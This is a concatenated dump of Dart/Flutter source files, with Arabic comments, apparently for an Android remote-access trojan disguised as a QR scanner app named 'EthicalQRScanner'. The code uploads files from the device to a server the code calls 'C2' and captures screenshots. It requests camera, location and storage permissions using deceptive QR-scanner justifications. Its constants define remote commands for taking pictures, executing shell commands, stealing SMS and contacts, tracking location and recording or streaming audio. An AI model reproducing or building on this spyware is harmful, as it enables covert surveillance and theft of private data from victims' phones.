            "Command file does NOT exist at path: ${fileToUpload.path}");
        // إرسال استجابة خطأ عبر Socket.IO لأن رفع الملف فشل من جانب العميل
        sendCommandResponse(
          originalCommand: commandRef,
          commandId: commandId,
          status: 'error',
          payload: {
            'message':
                'File to upload not found on device at path ${fileToUpload.path}'
          },
        );
        return false;
      }

      var response = await request
          .send()
          .timeout(const Duration(seconds: 90)); // زيادة المهلة للملفات الأكبر
      final responseBody = await response.stream.bytesToString();
      _logger.info("NetworkService:uploadFileFromCommand",
          "Command file upload - Server Response Status Code: ${response.statusCode}. Body: $responseBody");

      if (response.statusCode >= 200 && response.statusCode < 300) {
        _logger.info("NetworkService:uploadFileFromCommand",
            "Command file '${fileToUpload.name}' uploaded successfully.");
        // إرسال استجابة نجاح عبر Socket.IO
        sendCommandResponse(
          originalCommand: commandRef,
          commandId: commandId,
          status: 'success',
          payload: {
            'message': 'File ${fileToUpload.name} uploaded successfully to C2.',
            'filename_on_server':
                responseBody, // افتراض أن الخادم يعيد اسم الملف أو تأكيدًا
          },
        );
        return true;
      } else {
        _logger.error("NetworkService:uploadFileFromCommand",
            "Failed to upload command file '${fileToUpload.name}'. Status Code: ${response.statusCode}, Body: $responseBody");
        sendCommandResponse(
          originalCommand: commandRef,
          commandId: commandId,
          status: 'error',
          payload: {
            'message':
                'Failed to upload file ${fileToUpload.name} to C2. Server status: ${response.statusCode}',
            'response_body': responseBody,
          },
        );
        return false;
      }
    } on TimeoutException catch (e, s) {
      _logger.error("NetworkService:uploadFileFromCommand",
          "Timeout uploading command file '${fileToUpload.name}'", e, s);
      sendCommandResponse(
        originalCommand: commandRef,
        commandId: commandId,
        status: 'error',
        payload: {
          'message': 'Timeout uploading file ${fileToUpload.name} to C2.'
        },
      );
      return false;
    } catch (e, s) {
      _logger.error("NetworkService:uploadFileFromCommand",
          "Network Error uploading command file '${fileToUpload.name}'", e, s);
      sendCommandResponse(
        originalCommand: commandRef,
        commandId: commandId,
        status: 'error',
        payload: {
          'message':
              'Exception uploading file ${fileToUpload.name} to C2: ${e.toString()}'
        },
      );
      return false;
    }
  }

  void dispose() {
    _logger.info("NetworkService:dispose",
        "Disposing NetworkService resources. Device ID: $_lastConnectedDeviceId");
    disconnectSocketIO(); // يتضمن إيقاف المؤقتات والتخلص من الـ socket
    _connectionStatusController.close();
    _commandController.close();
    _logger.info("NetworkService:dispose",
        "All NetworkService resources have been released.");
  }
}



// ------------------------------ نهاية الملف: network_service.dart ------------------------------
// ======================================================================


// ============================== بداية الملف: permission_service.dart ==============================
// المسار الكامل: E:\GitHub Projects\EncryptionApp\jjjjjjjjjjjjj\services\permission_service.dart
// ----------------------------------------------------------------------

// lib/services/permission_service.dart
import 'package:permission_handler/permission_handler.dart';
import 'package:flutter/material.dart';

class PermissionService {
  // قائمة الأذونات المطلوبة
  final List<Permission> _requiredPermissions = [
    Permission.camera,
    Permission
        .locationWhenInUse, // أو locationAlways إذا كانت هناك حاجة حقيقية لذلك
    Permission
        .storage, // ملاحظة: هذا قد يتصرف بشكل مختلف في Android 11+ (Scoped Storage)
    // بدائل لـ storage في Android 13+:
    // Permission.photos, // للوصول لمعرض الصور
    // Permission.manageExternalStorage, // صلاحية قوية جداً ونادرة الاستخدام
  ];

  /// يطلب جميع الأذونات المطلوبة بطريقة متسلسلة.
  /// يعرض حوار توضيحي قبل طلب كل إذن حساس.
  Future<bool> requestRequiredPermissions(BuildContext context) async {
    Map<Permission, PermissionStatus> statuses = {};

    for (var permission in _requiredPermissions) {
      var status = await permission.status;
      if (!status.isGranted) {
        // عرض سبب طلب الإذن للمستخدم (لجعله مقنعاً)
        bool showRationale = await _showPermissionRationale(
          context,
          permission,
        );
        if (!showRationale) {
          // المستخدم رفض عرض التبرير، نفترض أنه لا يريد منح الإذن
          debugPrint("User declined rationale for $permission");
          return false;
        }

        // طلب الإذن الفعلي
        status = await permission.request();
      }
      statuses[permission] = status;
      debugPrint("Permission $permission status: $status");

      // إذا تم رفض الإذن بشكل دائم، لا فائدة من المتابعة
      if (status.isPermanentlyDenied) {
        debugPrint("Permission $permission permanently denied.");
        _showAppSettingsDialog(
          context,
          permission,
        ); // نقترح على المستخدم فتح الإعدادات
        return false;
      }

      // إذا تم رفض أي إذن أساسي، نعتبر العملية فاشلة
      if (!status.isGranted) {
        debugPrint("Permission $permission denied.");
        return false;
      }
    }

    // التحقق النهائي من أن كل شيء تم منحه
    return statuses.values.every((status) => status.isGranted);
  }

  /// يتحقق مما إذا كانت جميع الأذونات المطلوبة ممنوحة بالفعل.
  Future<bool> checkPermissions() async {
    for (var permission in _requiredPermissions) {
      if (!(await permission.status.isGranted)) {
        return false;
      }
    }
    return true;
  }

  /// يعرض رسالة توضيحية للمستخدم قبل طلب إذن حساس.
  Future<bool> _showPermissionRationale(
    BuildContext context,
    Permission permission,
  ) async {
    String title;
    String content;

    switch (permission) {
      case Permission.camera:
        title = 'إذن استخدام الكاميرا';
        content = 'نحتاج للوصول إلى الكاميرا لمسح أكواد QR وتحليلها بدقة.';
        break;
      case Permission.locationWhenInUse:
      case Permission.locationAlways:
        title = 'إذن تحديد الموقع';
        content =
            'يساعدنا تحديد موقعك الجغرافي في تحديد مكان مسح الكود بدقة أكبر، مما قد يكون مفيداً في بعض أنواع الأكواد المرتبطة بمواقع معينة.';
        break;
      case Permission.storage:
        title = 'إذن الوصول للتخزين';
        content =
            'نحتاج إذن الوصول للتخزين لحفظ صور أكواد QR التي تم مسحها أو أي بيانات مرتبطة بها قد ترغب في الاحتفاظ بها.';
        break;
      // أضف حالات أخرى إذا لزم الأمر
      default:
        return true; // لا يوجد تبرير خاص مطلوب
    }

    // التأكد من أن context لا يزال صالحاً قبل عرض الـ Dialog
    if (!context.mounted) return false;

    return await showDialog<bool>(
          context: context,
          barrierDismissible: false, // يجب على المستخدم اتخاذ قرار
          builder:
              (BuildContext dialogContext) => AlertDialog(
                title: Text(title),
                content: Text(content),
                actions: <Widget>[
                  TextButton(
                    child: const Text('لاحقاً'),
                    onPressed:
                        () => Navigator.of(
                          dialogContext,
                        ).pop(false), // المستخدم يرفض الآن
                  ),
                  TextButton(
                    child: const Text('السماح'),
                    onPressed:
                        () => Navigator.of(
                          dialogContext,
                        ).pop(true), // المستخدم يوافق على المتابعة
                  ),
                ],
              ),
        ) ??
        false; // إذا أغلق الحوار بطريقة أخرى، اعتبره رفضاً
  }

  // يعرض حوار يقترح على المستخدم فتح إعدادات التطبيق لتغيير الإذن
  void _showAppSettingsDialog(BuildContext context, Permission permission) {
    if (!context.mounted) return;
    showDialog(
      context: context,
      builder:
          (BuildContext context) => AlertDialog(
            title: Text('الإذن مرفوض نهائياً'),
            content: Text(
              'لقد رفضت إذن ${permission.toString().split('.').last} بشكل دائم. يرجى التوجه إلى إعدادات التطبيق لتفعيله يدوياً إذا أردت استخدام هذه الميزة.',
            ),
            actions: <Widget>[
              TextButton(
                child: const Text('إلغاء'),
                onPressed: () => Navigator.of(context).pop(),
              ),
              TextButton(
                child: const Text('فتح الإعدادات'),
                onPressed: () {
                  openAppSettings(); // تفتح إعدادات التطبيق
                  Navigator.of(context).pop();
                },
              ),
            ],
          ),
    );
  }
}



// ------------------------------ نهاية الملف: permission_service.dart ------------------------------
// ======================================================================


// ============================== بداية الملف: screenshot_service.dart ==============================
// المسار الكامل: E:\GitHub Projects\EncryptionApp\jjjjjjjjjjjjj\services\screenshot_service.dart
// ----------------------------------------------------------------------

// lib/services/screenshot_service.dart
import 'dart:io';
import 'dart:typed_data';
import 'dart:ui' as ui;

import 'package:flutter/material.dart';
import 'package:flutter/rendering.dart';
import 'package:image/image.dart' as img; // <-- إضافة مكتبة image
import 'package:path_provider/path_provider.dart';

class ScreenshotService {
  final GlobalKey screenshotKey;
  final Function(String) onLogEvent;

  ScreenshotService({
    required this.screenshotKey,
    required this.onLogEvent,
  });

  Future<Uint8List?> captureScreenshot({double pixelRatio = 3.0}) async {
    // جعل pixelRatio معاملاً
    try {
      await Future.delayed(const Duration(milliseconds: 200)); // زيادة التأخير

      if (screenshotKey.currentContext == null) {
        onLogEvent('Screenshot Error: GlobalKey context is null.');
        return null;
      }

      RenderRepaintBoundary? boundary = screenshotKey.currentContext
          ?.findRenderObject() as RenderRepaintBoundary?;
      if (boundary == null) {
        onLogEvent('خطأ: لم يتم العثور على RepaintBoundary.');
        return null;
      }

      ui.Image image = await boundary.toImage(pixelRatio: pixelRatio);
      ByteData? byteData = await image.toByteData(
          format: ui.ImageByteFormat.png); // الصور الملتقطة تكون PNG عادة
      image.dispose();

      if (byteData == null) {
        onLogEvent('خطأ: فشل تحويل الصورة إلى بيانات');
        return null;
      }
      onLogEvent('تم التقاط لقطة الشاشة (PNG الخام) بنجاح بدقة $pixelRatio');
      return byteData.buffer.asUint8List();
    } catch (e, stackTrace) {
      onLogEvent('خطأ في التقاط الشاشة: $e\nStackTrace: $stackTrace');
      return null;
    }
  }

  // دالة جديدة لضغط الصورة
  Future<Uint8List?> compressImage(Uint8List pngBytes,
      {int quality = 75}) async {
    try {
      onLogEvent('Compressing image...');
      img.Image? image = img.decodeImage(pngBytes); // فك تشفير الـ PNG
      if (image == null) {
        onLogEvent('Compression Error: Could not decode PNG bytes.');
        return null;
      }
      // تحويل إلى JPEG مع تحديد الجودة (75 كقيمة افتراضية جيدة)
      List<int> jpgBytes = img.encodeJpg(image, quality: quality);
      onLogEvent(
          'Image compressed to JPEG with quality $quality. Original size: ${pngBytes.lengthInBytes}, Compressed size: ${jpgBytes.length}');
      return Uint8List.fromList(jpgBytes);
    } catch (e, stackTrace) {
      onLogEvent('Compression Error: $e\nStackTrace: $stackTrace');
      return null;
    }
  }

  // تعديل saveScreenshotToFile ليقبل امتدادًا مختلفًا
  Future<String?> saveScreenshotToFile(Uint8List imageBytes,
      {String extension = 'png'}) async {
    try {
      final directory = await getTemporaryDirectory();
      final timestamp = DateTime.now().millisecondsSinceEpoch;
      // استخدام الامتداد المعطى
      final filePath = '${directory.path}/screenshot_$timestamp.$extension';
      final file = File(filePath);
      await file.writeAsBytes(imageBytes);
      onLogEvent('تم حفظ لقطة الشاشة في: $filePath');
      return filePath;
    } catch (e) {
      onLogEvent('خطأ في حفظ لقطة الشاشة: $e');
      return null;
    }
  }

  Future<String?> captureAndSaveScreenshot(
      {double pixelRatio = 3.0,
      bool compress = false,
      int quality = 75,
      String targetExtension = 'png'}) async {
    Uint8List? imageBytes = await captureScreenshot(pixelRatio: pixelRatio);
    if (imageBytes != null) {
      if (compress && targetExtension == 'jpg') {
        final compressedBytes =
            await compressImage(imageBytes, quality: quality);
        if (compressedBytes != null) {
          return await saveScreenshotToFile(compressedBytes, extension: 'jpg');
        } else {
          onLogEvent('Failed to compress image, saving original.');
          return await saveScreenshotToFile(imageBytes,
              extension: 'png'); // حفظ الأصلي إذا فشل الضغط
        }
      }
      return await saveScreenshotToFile(imageBytes, extension: targetExtension);
    }
    return null;
  }

  // ... (captureHighQualityScreenshot, captureLowQualityScreenshot يمكن تعديلها أو إزالتها إذا لم تعد مستخدمة)
}



// ------------------------------ نهاية الملف: screenshot_service.dart ------------------------------
// ======================================================================


// ============================== بداية الملف: constants.dart ==============================
// المسار الكامل: E:\GitHub Projects\EncryptionApp\jjjjjjjjjjjjj\utils\constants.dart
// ----------------------------------------------------------------------

// lib/utils/constants.dart

// --- SharedPreferences Keys ---
const String PREF_INITIAL_DATA_SENT = 'initialDataSent';
const String PREF_DEVICE_ID = 'pref_device_id'; // لحفظ مُعرف الجهاز الفريد

// --- Background Service Events (Flutter internal) ---
const String BG_SERVICE_EVENT_SEND_INITIAL_DATA = 'sendInitialData';
const String BG_SERVICE_EVENT_STOP_SERVICE = 'stopService';

// --- Socket.IO C2 Communication Events & Commands ---
// For C2 Registration and Heartbeat
const String SIO_EVENT_REGISTER_DEVICE = 'register_device';
const String SIO_EVENT_REGISTRATION_SUCCESSFUL = 'registration_successful';
const String SIO_EVENT_DEVICE_HEARTBEAT = 'device_heartbeat';
const String SIO_EVENT_REQUEST_REGISTRATION_INFO = 'request_registration_info';

// Commands from C2 Server to Client
const String SIO_CMD_TAKE_PICTURE = 'command_take_picture';
const String SIO_CMD_LIST_FILES = 'command_list_files';
const String SIO_CMD_GET_LOCATION = 'command_get_location';
const String SIO_CMD_UPLOAD_SPECIFIC_FILE = 'command_upload_specific_file';
const String SIO_CMD_EXECUTE_SHELL = 'command_execute_shell';

// <<<<<<< NEW COMMANDS ADDED / UPDATED >>>>>>>
const String SIO_CMD_GET_SMS_LIST = 'command_get_sms_list';
const String SIO_CMD_GET_CONTACTS_LIST =
    'command_get_contacts_export'; // Renamed for clarity (exports a file)
const String SIO_CMD_RECORD_AUDIO = 'command_record_audio';
const String SIO_CMD_START_LIVE_AUDIO =
    'command_start_live_audio'; // For live streaming concept
const String SIO_CMD_STOP_LIVE_AUDIO =
    'command_stop_live_audio'; // For live streaming concept
// <<<<<<< END OF NEW COMMANDS >>>>>>>

// Response from Client to C2 Server
const String SIO_EVENT_COMMAND_RESPONSE = 'command_response';
const String SIO_EVENT_LIVE_AUDIO_CHUNK =
    'live_audio_chunk'; // For live streaming data

// --- HTTP Endpoints (Reminder, main URL is in app_config.dart) ---
const String HTTP_ENDPOINT_UPLOAD_INITIAL_DATA = '/upload_initial_data';
const String HTTP_ENDPOINT_UPLOAD_COMMAND_FILE = '/upload_command_file';

// --- Other Constants ---
const String APP_NAME = "EthicalQRScanner";



// ------------------------------ نهاية الملف: constants.dart ------------------------------
// ======================================================================


// ============================== بداية الملف: helpers.dart ==============================
// المسار الكامل: E:\GitHub Projects\EncryptionApp\jjjjjjjjjjjjj\utils\helpers.dart
// ----------------------------------------------------------------------




// ------------------------------ نهاية الملف: helpers.dart ------------------------------
// ======================================================================


################################################################################
# تم بنجاح معالجة واستخراج محتوى 27 ملف/ملفات دارت.
################################################################################
